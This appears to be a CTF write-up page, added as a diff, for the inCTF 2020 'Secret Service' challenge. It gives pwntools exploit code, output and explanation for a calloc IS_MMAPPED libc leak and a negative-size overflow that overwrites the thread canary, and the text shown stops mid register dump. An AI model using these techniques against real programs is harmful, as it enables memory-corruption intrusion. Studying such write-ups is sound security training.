@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>inCTF 2020 - Secret Service | kileak</title>
+
+
+
+
+
+<meta name="description" content="inCTF 2020 - Secret Service">
+
+
+<meta name="keywords" content="inctf, secretservice">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2020/inctf-secretservice/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">inCTF 2020 - Secret Service</h1>
+      <p class="post-meta">Aug 1, 2020</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Secret Service
+1000
+<!--break--></p>
+
+  <p>Description</p>
+
+  <p>There’s a secret service hidden within the depths of the binary. Get into the service , use/pwn it as per your needs and dont forget to leave a feedback :P.</p>
+
+  <p>Note - The flag is eagerly wating to be read from the flag file , flag.</p>
+
+  <p>Connect To - nc 35.245.143.0 7777</p>
+
+  <p>Author - Cyb0rG</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/inctf20/secret/handout.zip">handout.zip</a> <a href="https://kileak.github.io/assets/inctf20/secret/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Pwn Thyself!
+Name: abc
+Age: 100
+Hold on while I redirect u to the secret service!
+Nah you're a kiddo!
+Tata Bye Bye!</code></pre></figure>
+
+<p>To be able to start with pwning the binary at all, we’ll have to “guess” a randomized age first.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">randomize_age</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="n">mapped</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">val1</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">val2</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">;</span>
+  <span class="kt">time_t</span> <span class="n">timer</span><span class="p">;</span> 
+  
+  <span class="n">seed</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer</span><span class="p">);</span>
+  
+  <span class="k">do</span>
+  <span class="p">{</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">seed</span> <span class="o">/</span> <span class="mh">0x3C</span><span class="p">);</span>
+
+    <span class="n">val1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xF000u</span> <span class="o">+</span> <span class="mi">4096</span><span class="p">;</span>
+
+    <span class="n">seed</span> <span class="o">+=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">seed</span> <span class="o">/</span> <span class="mh">0x1E</span><span class="p">);</span>
+
+    <span class="n">val2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xF000u</span> <span class="o">+</span> <span class="mi">4096</span><span class="p">;</span>
+
+    <span class="o">*</span><span class="n">mapped</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">mapped</span> <span class="o">&amp;=</span> <span class="n">v1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">mapped</span> <span class="o">&lt;=</span> <span class="mi">4095LL</span> <span class="p">);</span>
+
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Okay, some monkey work to do, but we can easily simulate this randomization to guess the age in our script.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+
+<span class="n">ctypes</span><span class="p">.</span><span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="n">lc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CDLL</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.245.143.0"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">7777</span>
+
+<span class="n">AGE</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">calcage</span><span class="p">():</span>
+  <span class="n">v4</span> <span class="o">=</span> <span class="n">lc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
+	
+  <span class="n">a1</span> <span class="o">=</span> <span class="mi">0</span>
+
+  <span class="k">while</span> <span class="n">a1</span> <span class="o">&lt;=</span> <span class="mi">4095</span><span class="p">:</span>
+    <span class="n">seed</span> <span class="o">=</span> <span class="n">v4</span> <span class="o">/</span> <span class="mh">0x3c</span>
+    <span class="n">lc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">seed</span><span class="p">))</span>
+
+    <span class="n">v1</span> <span class="o">=</span> <span class="n">lc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xf000</span> <span class="o">+</span> <span class="mi">4096</span>
+    <span class="n">v4</span> <span class="o">+=</span> <span class="n">lc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">300</span> <span class="o">+</span> <span class="mi">1</span>
+
+    <span class="n">lc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">v4</span> <span class="o">/</span> <span class="mh">0x1e</span><span class="p">))</span>
+
+    <span class="n">v2</span> <span class="o">=</span> <span class="n">lc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xf000</span> <span class="o">+</span> <span class="mi">4096</span>
+
+    <span class="n">a1</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+    <span class="n">a1</span> <span class="o">&amp;=</span> <span class="n">v1</span>
+
+  <span class="k">return</span> <span class="n">a1</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">name</span> <span class="o">=</span> <span class="s">"AAAA"</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">AGE</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+	
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+
+  <span class="n">AGE</span> <span class="o">=</span> <span class="n">calcage</span><span class="p">()</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span><span class="s">"./libc.so.6"</span><span class="p">})</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python3 work.py 
+[*] '/home/kileak/ctf/inctf/secret/handout/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+0x2004
+[+] Starting local process './chall': pid 6892
+[6892]
+[*] Paused (press any to continue)
+[*] Switching to interactive mode
+Hold on while I redirect u to the secret service!
+
+        Secret Service       
++-----------------------------+
+| 1. Enroll Yourself          |
+| 2. View Your Details        |
+| 3. Remove Yourself          |
+| 4. Move on                  |
+| 5. Quit Service             |
++-----------------------------+
+Your Choice &gt;&gt; $  </code></pre></figure>
+
+<p>So, now we have several options, which come down to malloc, show and free.</p>
+
+<p>The allocation uses <code class="language-plaintext highlighter-rouge">calloc</code>, which will allocate a chunk and zero it out, so no previous data from it can be reused.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">enroll_yourself</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">chunk</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">ENROLLMENT_COUNT</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"No more enrollments allowed!"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Enrollment Index : "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">ENROLLMENT_SET</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid or already enrolled!"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size : "</span><span class="p">);</span>
+  <span class="n">size</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x7E</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0xFFF9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Size not allowed!"</span><span class="p">);</span>
+    <span class="n">do_exit</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="n">ENROLLMENT_SIZES</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Enter your details -&gt; "</span><span class="p">);</span>
+  <span class="n">chunk</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">ENROLLMENT_SIZES</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
+
+  <span class="n">read_string</span><span class="p">(</span><span class="n">chunk</span><span class="p">,</span> <span class="n">ENROLLMENT_SIZES</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+  <span class="n">ENROLLMENTS</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span><span class="p">;</span>
+  <span class="n">ENROLLMENT_SET</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="o">++</span><span class="n">ENROLLMENT_COUNT</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Ok! You are enrolled now"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Nothing special in remove and view, they can just be used to view the content of the chunk or free it, no uaf or something similar, we’ll be using them just for getting a libc leak.</p>
+
+<p>But how can we leak something, if the chunks gets cleared immediately after allocation?</p>
+
+<p>Not sure where, but sometime ago, I read about the possibility to make <code class="language-plaintext highlighter-rouge">calloc</code> not initializing the memory allocated. Taking a look at the implementation of <code class="language-plaintext highlighter-rouge">calloc</code> in <code class="language-plaintext highlighter-rouge">malloc.c</code>, we can find this:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)
+</span>
+<span class="p">...</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="nf">__libc_calloc</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">n</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">elem_size</span><span class="p">)</span> 
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="cm">/* Two optional cases in which clearing not necessary */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">perturb_byte</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+      <span class="k">return</span> <span class="n">memset</span> <span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="n">mem</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This means, if the <code class="language-plaintext highlighter-rouge">IS_MMAPPED</code> bit from the chunk size is set, <code class="language-plaintext highlighter-rouge">calloc</code> will not zero out the content of the chunk before returning it.</p>
+
+<p>Let’s keep this in mind and check the rest of the available commands in the menu</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="mi">2020</span> <span class="p">)</span>
+      <span class="n">secret_service</span><span class="p">();</span></code></pre></figure>
+
+<p>There’s a function not shown in the menu (available by entering <code class="language-plaintext highlighter-rouge">2020</code>)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">secret_service</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> 
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> 
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">USED</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"No more hacking allowed!"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter index of Enrolled Candidate: "</span><span class="p">);</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">read_number</span><span class="p">();</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ENROLLMENTS</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">||</span> <span class="n">idx</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Index!"</span><span class="p">);</span>
+
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ENROLLMENTS</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>      <span class="c1">// point to chunk size</span>
+  <span class="o">++*</span><span class="n">v1</span><span class="p">;</span>                                  <span class="c1">// increase chunk size by 1</span>
+  <span class="k">return</span> <span class="n">USED</span><span class="o">++</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This function will increase the chunk size by 1 and may be used twice (also it doesn’t check if the current chunk is already freed), and that’s exactly what we need to set the <code class="language-plaintext highlighter-rouge">IS_MMAPPED</code> bit in the chunk size for a freed chunk.</p>
+
+<p>So let’s prepare the libc leak by creating a big enough chunk, free it, set the IS_MMAPPED bit by using the secret function and reallocate it.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">inc_chunksize</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2020"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+
+<span class="p">...</span>
+
+<span class="c1"># create chunk and free it
+</span><span class="n">enroll</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mh">0x800</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># set IS_MMAPPED bit in free chunk size
+</span><span class="n">inc_chunksize</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">inc_chunksize</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># reallocate it (chunk will be uninitialized now)
+</span><span class="n">enroll</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0xd20</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+
+<span class="c1"># read libc address from allocated chunk
+</span><span class="n">LEAK</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="mi">6</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x41</span> <span class="o">+</span> <span class="mh">0xe0</span>
+
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0x70</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__malloc_hook"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LEAK          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/kileak/ctf/inctf/secret/handout/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process './chall': pid 8193
+[8193]
+[*] Paused (press any to continue)
+[*] LEAK          : 0x7f2879d08be0
+[*] LIBC          : 0x7f2879b1d000
+[*] Switching to interactive mode</code></pre></figure>
+
+<p>Exhausting the use of the menu functions to get the libc leak, let’s take a look at the feedback function now.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">&lt;</span> <span class="mi">5</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Do u want to leave a feedback for the service?(y/n)"</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">s1</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">newthread</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">start_routine</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">pthread_join</span><span class="p">(</span><span class="n">newthread</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you!"</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">leave_feedback</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buffer</span><span class="p">;</span> 
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span><span class="p">;</span> 
+
+  <span class="n">canary</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"A new thread has been created for feedback"</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size of feedback: "</span><span class="p">);</span>
+  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">FEEDBACK_SIZE</span><span class="p">);</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter feedback: "</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">FEEDBACK_SIZE</span> <span class="o">&gt;</span> <span class="mi">112</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Size too large"</span><span class="p">);</span>
+    <span class="n">do_exit</span><span class="p">();</span>
+  <span class="p">}</span>
+  
+  <span class="n">dup_output_to_null</span><span class="p">();</span>
+  <span class="n">dup_error_to_null</span><span class="p">();</span>
+
+  <span class="n">read_feedback</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="n">FEEDBACK_SIZE</span><span class="p">);</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Thank you!"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">canary</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>No lower boundary check for <code class="language-plaintext highlighter-rouge">FEEDBACK_SIZE</code> here, so we can specify a negative feedback size, resulting in <code class="language-plaintext highlighter-rouge">read_feedback</code> reading near unlimited input, easily overflowing the buffer.</p>
+
+<p>But, we’ll have to get around the canary check, which otherwise will stop us from doing something useful with this overflow.</p>
+
+<p>Well, the feedback function was called via a thread created by <code class="language-plaintext highlighter-rouge">pthread_create</code>, thus creating its own stack for this function in a mmapped region and puts a <code class="language-plaintext highlighter-rouge">tcbhead_t</code> struct on it to for accessing thread specific information (and it will also contain the stack canary used for the canary check).</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span>
+<span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">tcb</span><span class="p">;</span>		<span class="cm">/* Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.  */</span>
+  <span class="n">dtv_t</span> <span class="o">*</span><span class="n">dtv</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">self</span><span class="p">;</span>		<span class="cm">/* Pointer to the thread descriptor.  */</span>
+  <span class="kt">int</span> <span class="n">multiple_threads</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">gscope_flag</span><span class="p">;</span>
+  <span class="kt">uintptr_t</span> <span class="n">sysinfo</span><span class="p">;</span>
+  <span class="kt">uintptr_t</span> <span class="n">stack_guard</span><span class="p">;</span>
+  <span class="kt">uintptr_t</span> <span class="n">pointer_guard</span><span class="p">;</span>
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">vgetcpu_cache</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="cp"># ifndef __ASSUME_PRIVATE_FUTEX
+</span>  <span class="kt">int</span> <span class="n">private_futex</span><span class="p">;</span>
+<span class="cp"># else
+</span>  <span class="kt">int</span> <span class="n">__glibc_reserved1</span><span class="p">;</span> 
+<span class="cp"># endif
+</span>  <span class="kt">int</span> <span class="n">__glibc_unused1</span><span class="p">;</span> 
+  <span class="cm">/* Reservation of some values for the TM ABI.  */</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">__private_tm</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+  <span class="cm">/* GCC split stack support.  */</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">__private_ss</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="kt">int</span> <span class="n">__glibc_reserved2</span><span class="p">;</span>
+  <span class="cm">/* Must be kept even if it is no longer used by glibc since programs,
+     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>
+  <span class="n">__128bits</span> <span class="n">__glibc_unused2</span><span class="p">[</span><span class="mi">8</span><span class="p">][</span><span class="mi">4</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">32</span><span class="p">)));</span>
+
+  <span class="kt">void</span> <span class="o">*</span><span class="n">__padding</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">tcbhead_t</span><span class="p">;</span></code></pre></figure>
+
+<p>Since we have an (almost) unlimited overwrite in the feedback function, we can for one overwrite the local canary and also the stored canary in the <code class="language-plaintext highlighter-rouge">tcbhead_t</code> struct.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$rax   : 0x7ffff7d3ae50    
+$rbx   : 0x7ffff7d3ae50    
+$rcx   : 0x7ffff7ee881b    
+$rdx   : 0x1               
+$rsp   : 0x7ffff7d3ae20    
+$rbp   : 0x7ffff7d3ae30    
+$rsi   : 0x7ffff7d3ae50    
